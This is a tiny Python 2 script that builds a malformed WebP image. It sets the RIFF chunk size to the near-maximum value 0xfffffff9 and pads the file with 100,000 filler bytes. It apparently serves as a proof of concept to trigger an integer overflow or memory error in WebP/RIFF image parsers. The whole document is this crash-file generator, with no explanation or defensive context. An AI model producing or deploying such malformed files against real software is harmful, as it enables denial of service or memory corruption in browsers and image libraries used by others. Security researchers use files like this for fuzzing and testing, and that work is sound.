#!/usr/bin/env python
import struct

s=''
s+='RIFF'
s+=struct.pack('<L',0xfffffff9)
s+='WEBP'
s+='X'*100000
file('1.webp','wb').write(s)
